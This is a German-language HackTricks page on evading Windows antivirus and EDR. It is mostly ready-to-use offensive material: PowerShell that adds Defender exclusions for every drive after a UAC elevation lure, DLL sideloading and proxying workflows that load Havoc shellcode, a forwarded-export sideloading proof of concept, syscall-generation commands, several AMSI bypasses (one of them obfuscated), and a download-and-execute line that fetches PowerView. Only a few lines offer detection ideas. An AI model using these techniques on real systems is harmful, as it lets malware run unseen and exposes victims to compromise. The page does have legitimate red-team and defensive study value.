# Antivirus (AV) Bypass

{{#include ../banners/hacktricks-training.md}}

**Diese Seite wurde ursprünglich von** [**@m2rc_p**](https://twitter.com/m2rc_p) **verfasst!**

## Defender stoppen

- [defendnot](https://github.com/es3n1n/defendnot): Ein Tool, um Windows Defender am Funktionieren zu hindern.
- [no-defender](https://github.com/es3n1n/no-defender): Ein Tool, um Windows Defender durch das Vortäuschen eines anderen AV am Funktionieren zu hindern.
- [Defender deaktivieren, wenn du Admin bist](basic-powershell-for-pentesters/README.md)

### Installer-artiger UAC-Köder vor Manipulationen an Defender

Öffentlich verfügbare Loader, die sich als Game Cheats tarnen, werden häufig als nicht signierte Node.js/Nexe-Installer ausgeliefert, die den Benutzer zunächst **zur Erhöhung der Berechtigungen auffordern** und erst danach Defender unschädlich machen. Der Ablauf ist einfach:

1. Mit `net session` prüfen, ob ein administrativer Kontext vorliegt. Der Befehl ist nur erfolgreich, wenn der Aufrufer über Admin-Rechte verfügt. Ein Fehlschlag zeigt daher an, dass der Loader als Standardbenutzer ausgeführt wird.
2. Sich sofort selbst mit dem Verb `RunAs` neu starten, um die erwartete UAC-Zustimmungsabfrage auszulösen und dabei die ursprüngliche Befehlszeile beizubehalten.
```powershell
if (-not (net session 2>$null)) {
powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
exit
}
```
Opfer glauben bereits, dass sie „gecrackte“ Software installieren, daher wird die Eingabeaufforderung normalerweise akzeptiert, wodurch die Malware die benötigten Rechte erhält, um die Defender-Richtlinie zu ändern.

### Flächendeckende `MpPreference`-Ausschlüsse für jeden Laufwerksbuchstaben

Nach der Rechteerweiterung maximieren GachiLoader-artige Chains die blinden Flecken von Defender, anstatt den Dienst direkt zu deaktivieren. Der Loader beendet zunächst den GUI-Watchdog (`taskkill /F /IM SecHealthUI.exe`) und setzt anschließend **extrem weitreichende Ausschlüsse**, sodass jedes Benutzerprofil, jedes Systemverzeichnis und jedes Wechsellaufwerk nicht mehr gescannt werden kann:
```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```
Wichtige Beobachtungen:

- Die Schleife durchläuft jedes eingebundene Dateisystem (D:\, E:\, USB-Sticks usw.), sodass **jede zukünftige Payload, die irgendwo auf der Festplatte abgelegt wird, ignoriert wird**.
- Der Ausschluss der Erweiterung `.sys` ist zukunftsorientiert – Angreifer behalten sich damit die Möglichkeit vor, später unsignierte Treiber zu laden, ohne Defender erneut anzufassen.
- Alle Änderungen landen unter `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions`, sodass spätere Phasen bestätigen können, dass die Ausschlüsse bestehen bleiben, oder sie erweitern können, ohne UAC erneut auszulösen.

Da kein Defender-Dienst gestoppt wird, melden naive Zustandsprüfungen weiterhin „Antivirus aktiv“, obwohl die Echtzeitüberprüfung diese Pfade nie überprüft.

## **AV Evasion Methodology**

Derzeit verwenden AVs verschiedene Methoden, um zu überprüfen, ob eine Datei malicious ist oder nicht: statische Erkennung, dynamische Analyse und bei den fortschrittlicheren EDRs Verhaltensanalyse.

### **Statische Erkennung**

Die statische Erkennung erfolgt durch das Markieren bekannter malicious Strings oder Byte-Arrays in einer Binary oder einem Script sowie durch das Extrahieren von Informationen aus der Datei selbst (z. B. Dateibeschreibung, Firmenname, digitale Signaturen, Icon, Prüfsumme usw.). Das bedeutet, dass die Verwendung bekannter öffentlicher Tools dazu führen kann, dass du leichter entdeckt wirst, da sie wahrscheinlich bereits analysiert und als malicious markiert wurden. Es gibt einige Möglichkeiten, diese Art der Erkennung zu umgehen:

- **Verschlüsselung**

Wenn du die Binary verschlüsselst, gibt es für AV keine Möglichkeit, dein Programm zu erkennen. Du benötigst jedoch eine Art Loader, um das Programm zu entschlüsseln und im Speicher auszuführen.

- **Obfuscation**

Manchmal musst du lediglich einige Strings in deiner Binary oder deinem Script ändern, damit es AV passiert. Je nachdem, was du obfuscaten möchtest, kann dies jedoch zeitaufwendig sein.

- **Custom Tooling**

Wenn du deine eigenen Tools entwickelst, gibt es keine bekannten schlechten Signaturen. Dies erfordert jedoch viel Zeit und Aufwand.

> [!TIP]
> Eine gute Möglichkeit, die statische Erkennung durch Windows Defender zu überprüfen, ist [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Das Tool teilt die Datei grundsätzlich in mehrere Segmente auf und beauftragt Defender, jedes davon einzeln zu scannen. Auf diese Weise kann es dir genau sagen, welche Strings oder Bytes in deiner Binary markiert wurden.

Ich empfehle dir dringend, dir diese [YouTube-Playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) über praktische AV Evasion anzusehen.

### **Dynamische Analyse**

Bei der dynamischen Analyse führt das AV deine Binary in einer Sandbox aus und überwacht malicious Aktivitäten (z. B. das Entschlüsseln und Auslesen der Browser-Passwörter, das Erstellen eines Minidumps von LSASS usw.). Dieser Teil kann etwas schwieriger sein, aber hier sind einige Dinge, die du tun kannst, um Sandboxes zu umgehen.

- **Vor der Ausführung schlafen** Je nach Implementierung kann dies eine gute Möglichkeit sein, die dynamische Analyse des AVs zu umgehen. AVs haben nur sehr wenig Zeit, um Dateien zu scannen, damit der Workflow des Benutzers nicht unterbrochen wird. Lange Sleeps können daher die Analyse von Binaries stören. Das Problem ist, dass viele AV-Sandboxes den Sleep abhängig von seiner Implementierung einfach überspringen können.
- **Ressourcen des Computers überprüfen** Normalerweise verfügen Sandboxes nur über sehr wenige Ressourcen (z. B. < 2 GB RAM), da sie sonst den Computer des Benutzers verlangsamen könnten. Du kannst hier auch sehr kreativ werden, indem du beispielsweise die Temperatur der CPU oder sogar die Lüftergeschwindigkeit überprüfst – nicht alles davon wird in der Sandbox implementiert sein.
- **Maschinenspezifische Prüfungen** Wenn du einen Benutzer angreifen möchtest, dessen Workstation der Domäne „contoso.local“ beigetreten ist, kannst du die Domäne des Computers überprüfen, um festzustellen, ob sie mit der von dir angegebenen übereinstimmt. Falls nicht, kannst du dein Programm beenden lassen.

Es stellt sich heraus, dass der Computername der Microsoft Defender Sandbox HAL9TH lautet. Du kannst daher vor der Detonation den Computernamen in deiner Malware überprüfen. Wenn der Name HAL9TH entspricht, befindest du dich in der Sandbox von Defender und kannst dein Programm beenden lassen.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>Quelle: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Hier sind einige weitere wirklich gute Tipps von [@mgeeky](https://twitter.com/mariuszbit), um Sandboxes zu umgehen.

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>

Wie wir bereits zuvor in diesem Beitrag gesagt haben, werden **öffentliche Tools** irgendwann **erkannt**. Daher solltest du dir eine Frage stellen:

Wenn du beispielsweise LSASS dumpen möchtest, **musst du wirklich mimikatz verwenden**? Oder könntest du ein anderes Projekt verwenden, das weniger bekannt ist und ebenfalls LSASS dumpen kann?

Die richtige Antwort ist wahrscheinlich Letzteres. Am Beispiel von mimikatz ist es wahrscheinlich eines der, wenn nicht sogar das am häufigsten von AVs und EDRs markierte Malware-Stück. Obwohl das Projekt selbst sehr cool ist, ist es auch ein Albtraum, damit AVs zu umgehen. Suche daher einfach nach Alternativen für das, was du erreichen möchtest.

> [!TIP]
> Wenn du deine Payloads zur Evasion modifizierst, achte darauf, die **automatische Übermittlung von Samples** in Defender zu deaktivieren. Und bitte, wirklich, **LADE SIE NICHT AUF VIRUSTOTAL HOCH**, wenn dein Ziel langfristige Evasion ist. Wenn du überprüfen möchtest, ob deine Payload von einem bestimmten AV erkannt wird, installiere es auf einer VM, versuche die automatische Übermittlung von Samples zu deaktivieren und teste es dort, bis du mit dem Ergebnis zufrieden bist.

## EXEs vs DLLs

Wann immer möglich, solltest du für Evasion immer **DLLs gegenüber EXEs priorisieren**. Meiner Erfahrung nach werden DLL-Dateien normalerweise **deutlich seltener erkannt** und analysiert. Daher ist dies in manchen Fällen ein sehr einfacher Trick, um eine Erkennung zu vermeiden (sofern deine Payload natürlich auf irgendeine Weise als DLL ausgeführt werden kann).

Wie wir in diesem Bild sehen können, hat eine DLL Payload von Havoc auf antiscan.me eine Erkennungsrate von 4/26, während die EXE-Payload eine Erkennungsrate von 7/26 aufweist.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me-Vergleich zwischen einer normalen Havoc-EXE-Payload und einer normalen Havoc-DLL</p></figcaption></figure>

Nun zeigen wir einige Tricks, die du mit DLL-Dateien verwenden kannst, um deutlich stealthier zu sein.

## DLL Sideloading & Proxying

**DLL Sideloading** nutzt die vom Loader verwendete DLL-Suchreihenfolge aus, indem sowohl die Opferanwendung als auch die malicious Payload(s) nebeneinander platziert werden.

Du kannst mit [Siofra](https://github.com/Cybereason/siofra) und dem folgenden PowerShell-Script nach Programmen suchen, die für DLL Sideloading anfällig sind:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
Dieser Befehl gibt die Liste der für DLL hijacking anfälligen Programme innerhalb von "C:\Program Files\\" sowie die DLL-Dateien aus, die sie zu laden versuchen.

Ich empfehle dringend, **DLL Hijackable/Sideloadable programs selbst zu untersuchen**. Diese Technik ist bei korrekter Umsetzung ziemlich stealthy. Wenn du jedoch öffentlich bekannte DLL Sideloadable programs verwendest, wirst du möglicherweise leicht entdeckt.

Allein das Platzieren einer malicious DLL mit dem Namen, den ein Programm zu laden erwartet, führt nicht dazu, dass dein Payload geladen wird, da das Programm bestimmte Funktionen innerhalb dieser DLL erwartet. Um dieses Problem zu beheben, verwenden wir eine weitere Technik namens **DLL Proxying/Forwarding**.

**DLL Proxying** leitet die Aufrufe, die ein Programm ausführt, vom Proxy (und malicious) DLL an die originale DLL weiter. Dadurch bleibt die Funktionalität des Programms erhalten, während dein Payload ausgeführt werden kann.

Ich werde das Projekt [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) von [@flangvik](https://twitter.com/Flangvik/) verwenden.

Dies sind die Schritte, die ich befolgt habe:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
Der letzte Befehl liefert uns 2 Dateien: eine DLL-Quellcodevorlage und die umbenannte originale DLL.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
Das sind die Ergebnisse:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Sowohl unser Shellcode (mit [SGN](https://github.com/EgeBalci/sgn) codiert) als auch die Proxy-DLL haben in [antiscan.me](https://antiscan.me) eine Erkennungsrate von 0/26! Ich würde das als Erfolg bezeichnen.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Ich **empfehle dringend**, das [Twitch-VOD von S3cur3Th1sSh1t](https://www.twitch.tv/videos/1644171543) über DLL Sideloading sowie [ipps​​ecs Video](https://www.youtube.com/watch?v=3eROsG_WNpE) anzusehen, um mehr über das, was wir besprochen haben, im Detail zu erfahren.

### Ausnutzen weitergeleiteter Exports (ForwardSideLoading)

Windows-PE-Module können Funktionen exportieren, die tatsächlich „Forwarder“ sind: Statt auf Code zu zeigen, enthält der Export-Eintrag einen ASCII-String im Format `TargetDll.TargetFunc`. Wenn ein Aufrufer den Export auflöst, führt der Windows-Loader Folgendes aus:

- `TargetDll` laden, falls es noch nicht geladen ist
- `TargetFunc` daraus auflösen

Wichtige Verhaltensweisen, die man verstehen sollte:
- Wenn `TargetDll` eine KnownDLL ist, wird sie aus dem geschützten KnownDLLs-Namespace bereitgestellt (z. B. ntdll, kernelbase, ole32).
- Wenn `TargetDll` keine KnownDLL ist, wird die normale DLL-Suchreihenfolge verwendet, die auch das Verzeichnis des Moduls einschließt, das die Weiterleitung auflöst.

Dies ermöglicht ein indirektes Sideloading-Primitiv: Man sucht eine signierte DLL, die eine Funktion exportiert, die an ein Nicht-KnownDLL-Modul weitergeleitet wird, und platziert diese signierte DLL zusammen mit einer vom Angreifer kontrollierten DLL, die genau den Namen des weitergeleiteten Zielmoduls trägt. Wenn der weitergeleitete Export aufgerufen wird, löst der Loader die Weiterleitung auf und lädt die eigene DLL aus demselben Verzeichnis, wodurch deren `DllMain` ausgeführt wird.

Beispiel, beobachtet unter Windows 11:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` ist keine KnownDLL und wird daher über die normale Suchreihenfolge aufgelöst.

PoC (copy-paste):
1) Kopiere die signierte System-DLL in einen beschreibbaren Ordner
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Lege eine bösartige `NCRYPTPROV.dll` im selben Ordner ab. Eine minimale DllMain reicht aus, um Codeausführung zu erreichen; du musst die weitergeleitete Funktion nicht implementieren, damit DllMain ausgelöst wird.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) Den Forward mit einem signierten LOLBin auslösen:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
Beobachtetes Verhalten:
- rundll32 (signiert) lädt die Side-by-Side-`keyiso.dll` (signiert)
- Beim Auflösen von `KeyIsoSetAuditingInterface` folgt der Loader dem Forward auf `NCRYPTPROV.SetAuditingInterface`
- Der Loader lädt anschließend `NCRYPTPROV.dll` aus `C:\test` und führt dessen `DllMain` aus
- Wenn `SetAuditingInterface` nicht implementiert ist, erhältst du den Fehler "missing API" erst, nachdem `DllMain` bereits ausgeführt wurde

Hunting-Tipps:
- Konzentriere dich auf weitergeleitete Exports, bei denen das Zielmodul keine KnownDLL ist. KnownDLLs sind unter `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs` aufgelistet.
- Du kannst weitergeleitete Exports mit Tools wie den folgenden auflisten:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Siehe das Windows-11-Forwarder-Inventar, um nach geeigneten Kandidaten zu suchen: https://hexacorn.com/d/apis_fwd.txt

Ideen zur Erkennung/Abwehr:
- Überwache LOLBins (z. B. rundll32.exe), die signierte DLLs aus nicht systembezogenen Pfaden laden, gefolgt vom Laden von Nicht-KnownDLLs mit demselben Basisnamen aus diesem Verzeichnis
- Erzeuge Alarme bei Prozess-/Modulketten wie: `rundll32.exe` → nicht systembezogenes `keyiso.dll` → `NCRYPTPROV.dll` unter benutzerbeschreibbaren Pfaden
- Erzwinge Code-Integritätsrichtlinien (WDAC/AppLocker) und untersage Schreib- und Ausführrechte in Anwendungsverzeichnissen

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

Du kannst Freeze verwenden, um deinen Shellcode auf unauffällige Weise zu laden und auszuführen.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasion ist lediglich ein Katz-und-Maus-Spiel. Was heute funktioniert, könnte morgen erkannt werden. Verlasse dich daher niemals nur auf ein einziges Tool und versuche, wenn möglich, mehrere Evasion-Techniken miteinander zu verketten.

## Direct/Indirect Syscalls & SSN Resolution (SysWhispers4)

EDRs setzen häufig **user-mode inline hooks** auf den Syscall-Stubs von `ntdll.dll`. Um diese Hooks zu umgehen, kannst du **directe** oder **indirecte** Syscall-Stubs generieren, die die korrekte **SSN** (System Service Number) laden und in den Kernel-Modus wechseln, ohne den gehookten Export-Einstiegspunkt auszuführen.

**Aufrufoptionen:**
- **Direct (embedded)**: Eine `syscall`-/`sysenter`-/`SVC #0`-Anweisung in den generierten Stub einfügen (kein Treffer des `ntdll`-Exports).
- **Indirect**: In ein vorhandenes `syscall`-Gadget innerhalb von `ntdll` springen, sodass der Kernel-Übergang scheinbar von `ntdll` ausgeht (nützlich zur heuristischen Evasion); **randomized indirect** wählt pro Aufruf ein Gadget aus einem Pool aus.
- **Egg-hunt**: Vermeidet das Einbetten der statischen `0F 05`-Opcode-Sequenz auf der Festplatte und löst eine Syscall-Sequenz zur Laufzeit auf.

**Hook-resistente Strategien zur SSN-Auflösung:**
- **FreshyCalls (VA sort)**: SSNs durch Sortieren der Syscall-Stubs nach virtueller Adresse ableiten, anstatt Stub-Bytes auszulesen.
- **SyscallsFromDisk**: Eine saubere `\KnownDlls\ntdll.dll` mappen, SSNs aus deren `.text` auslesen und sie anschließend wieder unmappen (umgeht alle In-Memory-Hooks).
- **RecycledGate**: Die VA-sortierte SSN-Ableitung mit einer Opcode-Validierung kombinieren, wenn ein Stub sauber ist; bei einem Hook auf die VA-Ableitung zurückfallen.
- **HW Breakpoint**: DR0 auf die `syscall`-Anweisung setzen und einen VEH verwenden, um die SSN zur Laufzeit aus `EAX` zu erfassen, ohne gehookte Bytes zu parsen.

Beispiel für die Verwendung von SysWhispers4:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```
## AMSI (Anti-Malware Scan Interface)

AMSI wurde entwickelt, um "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)" zu verhindern. Ursprünglich waren AVs nur in der Lage, **Dateien auf der Festplatte** zu scannen. Wenn man also irgendwie Payloads **direkt im Speicher** ausführen konnte, konnte der AV nichts dagegen unternehmen, da ihm nicht genügend Sichtbarkeit zur Verfügung stand.

Die AMSI-Funktion ist in diese Windows-Komponenten integriert.

- Benutzerkontensteuerung bzw. UAC (Erhöhung der Berechtigungen bei der Installation von EXE, COM, MSI oder ActiveX)
- PowerShell (Skripte, interaktive Verwendung und dynamische Codeauswertung)
- Windows Script Host (wscript.exe und cscript.exe)
- JavaScript und VBScript
- Office-VBA-Makros

Sie ermöglicht es Antivirus-Lösungen, das Verhalten von Skripten zu überprüfen, indem sie Skriptinhalte in einer Form bereitstellt, die sowohl unverschlüsselt als auch nicht verschleiert ist.

Die Ausführung von `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` erzeugt unter Windows Defender den folgenden Alarm.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Beachte, dass `amsi:` vorangestellt wird, gefolgt vom Pfad zur ausführbaren Datei, aus der das Skript ausgeführt wurde, in diesem Fall powershell.exe.

Wir haben keine Datei auf die Festplatte geschrieben, wurden aber wegen AMSI trotzdem im Speicher erkannt.

Außerdem wird C#-Code seit **.NET 4.8** ebenfalls durch AMSI ausgeführt. Das betrifft sogar `Assembly.Load(byte[])`, um eine Ausführung im Speicher zu laden. Deshalb wird für die Ausführung im Speicher die Verwendung niedrigerer .NET-Versionen (wie 4.7.2 oder niedriger) empfohlen, wenn du AMSI umgehen möchtest.

Es gibt mehrere Möglichkeiten, AMSI zu umgehen:

- **Obfuscation**

Da AMSI hauptsächlich mit statischen Erkennungen arbeitet, kann das Modifizieren der zu ladenden Skripte eine gute Möglichkeit sein, einer Erkennung zu entgehen.

AMSI ist jedoch in der Lage, Skripte auch dann zu entschleiern, wenn sie mehrere Schichten enthalten. Daher kann Obfuscation abhängig von der Umsetzung eine schlechte Option sein. Dadurch ist das Umgehen nicht ganz unkompliziert. Manchmal reicht es jedoch aus, ein paar Variablennamen zu ändern, und die Erkennung wird verhindert. Es hängt also davon ab, wie stark etwas markiert wurde.

- **AMSI Bypass**

Da AMSI implementiert wird, indem eine DLL in den powershell-Prozess (sowie cscript.exe, wscript.exe usw.) geladen wird, kann sie relativ einfach manipuliert werden, sogar bei Ausführung als unprivilegierter Benutzer. Aufgrund dieses Fehlers in der Implementierung von AMSI haben Forscher mehrere Möglichkeiten gefunden, AMSI-Scans zu umgehen.

**Forcing an Error**

Wenn die AMSI-Initialisierung fehlschlägt (amsiInitFailed), wird für den aktuellen Prozess kein Scan gestartet. Ursprünglich wurde dies von [Matt Graeber](https://twitter.com/mattifestation) veröffentlicht, und Microsoft hat eine Signatur entwickelt, um eine weitere Verbreitung dieser Methode zu verhindern.
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
Es genügte eine einzige Zeile PowerShell-Code, um AMSI für den aktuellen PowerShell-Prozess unbrauchbar zu machen. Diese Zeile wurde natürlich von AMSI selbst erkannt, daher sind einige Änderungen erforderlich, um diese Technik verwenden zu können.

Hier ist ein modifizierter AMSI-Bypass, den ich aus diesem [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db) übernommen habe.
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Beachte, dass dies wahrscheinlich als verdächtig markiert wird, sobald dieser Beitrag veröffentlicht wird. Du solltest daher keinen Code veröffentlichen, wenn du unentdeckt bleiben möchtest.

**Memory Patching**

Diese Technik wurde ursprünglich von [@RastaMouse](https://twitter.com/_RastaMouse/) entdeckt. Sie besteht darin, die Adresse der Funktion "AmsiScanBuffer" in amsi.dll zu finden (verantwortlich für das Scannen der vom Benutzer bereitgestellten Eingaben) und sie mit Anweisungen zu überschreiben, die den Code für E_INVALIDARG zurückgeben. Dadurch gibt das Ergebnis des eigentlichen Scans 0 zurück, was als sauberes Ergebnis interpretiert wird.

> [!TIP]
> Lies bitte [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) für eine ausführlichere Erklärung.

Es gibt auch viele andere Techniken, um AMSI mit powershell zu umgehen. Sieh dir [**diese Seite**](basic-powershell-for-pentesters/index.html#amsi-bypass) und [**dieses repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) an, um mehr darüber zu erfahren.

### AMSI blockieren, indem das Laden von amsi.dll verhindert wird (LdrLoadDll hook)

AMSI wird erst initialisiert, nachdem `amsi.dll` in den aktuellen Prozess geladen wurde. Ein robuster, sprachunabhängiger Bypass besteht darin, einen User-Mode-Hook auf `ntdll!LdrLoadDll` zu setzen, der einen Fehler zurückgibt, wenn das angeforderte Modul `amsi.dll` ist. Dadurch wird AMSI nie geladen und es finden für diesen Prozess keine Scans statt.

Implementierungsübersicht (x64-C/C++-Pseudocode):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
if (module && module->Buffer){
UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
if (RtlEqualUnicodeString(module, &amsi, TRUE)){
// Pretend the DLL cannot be found → AMSI never initialises in this process
return STATUS_DLL_NOT_FOUND; // 0xC0000135
}
}
return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
// Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
// e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Hinweise
- Funktioniert gleichermaßen mit PowerShell, WScript/CScript und benutzerdefinierten Loaders (also allem, was AMSI andernfalls laden würde).
- Kombiniere dies mit dem Übergeben von Scripts über stdin (`PowerShell.exe -NoProfile -NonInteractive -Command -`), um lange Command-Line-Artefakte zu vermeiden.
- Wurde bei Loadern beobachtet, die über LOLBins ausgeführt werden (z. B. `regsvr32`, das `DllRegisterServer` aufruft).

Das Tool **[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** generiert ebenfalls ein Script zum Umgehen von AMSI.
Das Tool **[https://amsibypass.com/](https://amsibypass.com/)** generiert ebenfalls ein Script zum Umgehen von AMSI, das Signaturen durch randomisierte benutzerdefinierte Funktionen, Variablen und Zeichenausdrücke vermeidet und eine zufällige Groß- und Kleinschreibung auf PowerShell-Schlüsselwörter anwendet, um Signaturen zu vermeiden.

**Die erkannte Signatur entfernen**

Du kannst ein Tool wie **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** und **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** verwenden, um die erkannte AMSI-Signatur aus dem Speicher des aktuellen Prozesses zu entfernen. Dieses Tool scannt den Speicher des aktuellen Prozesses nach der AMSI-Signatur und überschreibt sie anschließend mit NOP-Instruktionen, wodurch sie effektiv aus dem Speicher entfernt wird.

**AV/EDR-Produkte, die AMSI verwenden**

Eine Liste der AV/EDR-Produkte, die AMSI verwenden, findest du unter **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**PowerShell-Version 2 verwenden**
Wenn du PowerShell-Version 2 verwendest, wird AMSI nicht geladen, sodass du deine Scripts ausführen kannst, ohne dass sie von AMSI gescannt werden. Das kannst du folgendermaßen tun:
```bash
powershell.exe -version 2
```
## PS-Logging

PowerShell-Logging ist eine Funktion, mit der alle auf einem System ausgeführten PowerShell-Befehle protokolliert werden können. Dies kann für Audit- und Fehlerbehebungszwecke nützlich sein, aber es kann auch ein **Problem für Angreifer sein, die einer Erkennung entgehen möchten**.

Um PowerShell-Logging zu umgehen, können Sie die folgenden Techniken verwenden:

- **PowerShell Transcription und Module Logging deaktivieren**: Sie können dafür ein Tool wie [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) verwenden.
- **PowerShell Version 2 verwenden**: Wenn Sie PowerShell Version 2 verwenden, wird AMSI nicht geladen, sodass Sie Ihre Skripte ausführen können, ohne dass sie von AMSI gescannt werden. Dies ist folgendermaßen möglich: `powershell.exe -version 2`
- **Eine Unmanaged-PowerShell-Session verwenden**: Verwenden Sie [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell), um eine PowerShell ohne Schutzmechanismen zu starten (dies verwendet `powerpick` von Cobal Strike).


## Obfuscation

> [!TIP]
> Mehrere Obfuscation-Techniken basieren auf der Verschlüsselung von Daten. Dadurch wird die Entropie der Binärdatei erhöht, was es AVs und EDRs erleichtert, sie zu erkennen. Seien Sie dabei vorsichtig und wenden Sie die Verschlüsselung möglicherweise nur auf bestimmte Abschnitte Ihres Codes an, die sensibel sind oder verborgen werden müssen.

### Deobfuscating ConfuserEx-Protected .NET Binaries

Bei der Analyse von Malware, die ConfuserEx 2 (oder kommerzielle Forks) verwendet, stößt man häufig auf mehrere Schutzschichten, die Decompiler und Sandboxes blockieren. Der folgende Workflow **stellt zuverlässig ein nahezu ursprüngliches IL** wieder her, das anschließend mit Tools wie dnSpy oder ILSpy zu C# dekompiliert werden kann.

